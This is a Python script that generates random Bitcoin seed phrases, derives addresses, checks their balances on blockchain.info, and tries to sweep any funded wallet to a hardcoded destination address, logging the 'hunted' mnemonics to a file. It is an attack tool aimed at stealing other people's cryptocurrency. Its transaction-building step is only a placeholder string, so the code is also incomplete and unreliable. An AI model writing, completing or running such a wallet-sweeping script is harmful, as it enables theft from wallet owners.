import os
import time
import requests
from mnemonic import Mnemonic
from bip32utils import BIP32Key
from hashlib import sha256, new as hashlib_new
import ecdsa
import base58

# Set to keep track of checked addresses
checked_addresses = set()

def generate_mnemonic(word_count=24):
    mnemo = Mnemonic("english")
    mnemonic = mnemo.generate(strength=word_count * 32 // 3)
    return mnemonic

def mnemonic_to_seed(mnemonic):
    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(mnemonic)
    return seed

def derive_private_keys(seed):
    bip32_root_key_obj = BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(0).ChildKey(0).ChildKey(0).ChildKey(0).ChildKey(0)
    return bip32_child_key_obj.WalletImportFormat(), bip32_child_key_obj.PrivateKey()

def private_key_to_wif(private_key_hex):
    private_key_bytes = bytes.fromhex(private_key_hex)
    extended_key = b'\x80' + private_key_bytes
    first_sha256 = sha256(extended_key).digest()
    second_sha256 = sha256(first_sha256).digest()
    checksum = second_sha256[:4]
    wif = extended_key + checksum
    return base58.b58encode(wif).decode()

def private_key_to_public_key(private_key, compressed=True):
    sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    vk = sk.verifying_key
    if compressed:
        return (b'\x02' + vk.to_string()[:32]) if vk.to_string()[-1] % 2 == 0 else (b'\x03' + vk.to_string()[:32])
    else:
        return b'\x04' + vk.to_string()

def public_key_to_address(public_key):
    sha256_pk = sha256(public_key).digest()
    ripemd160 = hashlib_new('ripemd160')
    ripemd160.update(sha256_pk)
    hashed_public_key = ripemd160.digest()
    extended_ripemd160 = b'\x00' + hashed_public_key
    checksum = sha256(sha256(extended_ripemd160).digest()).digest()[:4]
    binary_address = extended_ripemd160 + checksum
    address = base58.b58encode(binary_address).decode()
    return address

def check_balance(address):
    response = requests.get(f'https://blockchain.info/q/addressbalance/{address}')
    if response.status_code == 200:
        return int(response.text)
    else:
        return 0

def create_transaction(private_key_wif, source_address, dest_address, balance):
    tx_fee = 10000  # satoshis (0.0001 BTC)
    net_balance = balance - tx_fee
    if net_balance <= 0:
        return None

    # Construct raw transaction (simplified example, needs actual implementation)
    raw_tx = f"Raw transaction data from {source_address} to {dest_address} with {net_balance} satoshis"
    return raw_tx

def broadcast_transaction(raw_tx):
    response = requests.post("https://blockchain.info/pushtx", data={'tx': raw_tx})
    return response.status_code == 200

def save_to_file(data, filename):
    with open(filename, 'a') as f:
        f.write(data + '\n')

def main():
    word_counts = [12, 18, 24]  # Different lengths of mnemonic phrases
    while True:
        try:
            for word_count in word_counts:
                mnemonic = generate_mnemonic(word_count)
                seed = mnemonic_to_seed(mnemonic)
                wif, private_key = derive_private_keys(seed)
                
                uncompressed_public_key = private_key_to_public_key(private_key, compressed=False)
                compressed_public_key = private_key_to_public_key(private_key, compressed=True)
                
                uncompressed_address = public_key_to_address(uncompressed_public_key)
                compressed_address = public_key_to_address(compressed_public_key)
                
                if uncompressed_address in checked_addresses and compressed_address in checked_addresses:
                    continue

                uncompressed_balance = check_balance(uncompressed_address)
                compressed_balance = check_balance(compressed_address)

                checked_addresses.add(uncompressed_address)
                checked_addresses.add(compressed_address)
                
                if uncompressed_balance > 1000000:
                    raw_tx = create_transaction(wif, uncompressed_address, "3KgiK7FdnEHpBDt3uie9mU1QRnVN8sP81o", uncompressed_balance)
                    if raw_tx and broadcast_transaction(raw_tx):
                        save_to_file(mnemonic, 'hunted.txt')

                if compressed_balance > 1000000:
                    raw_tx = create_transaction(wif, compressed_address, "3KgiK7FdnEHpBDt3uie9mU1QRnVN8sP81o", compressed_balance)
                    if raw_tx and broadcast_transaction(raw_tx):
                        save_to_file(mnemonic, 'hunted.txt')
                
                print(f'Mnemonic ({word_count} words): {mnemonic}')
                print(f'Uncompressed Address: {uncompressed_address}, Balance: {uncompressed_balance}')
                print(f'Compressed Address: {compressed_address}, Balance: {compressed_balance}')
        
        except Exception as e:
            print(f'Error: {e}')
        
        time.sleep(1)  # Sleep for a second before next iteration

if __name__ == '__main__':
    main()
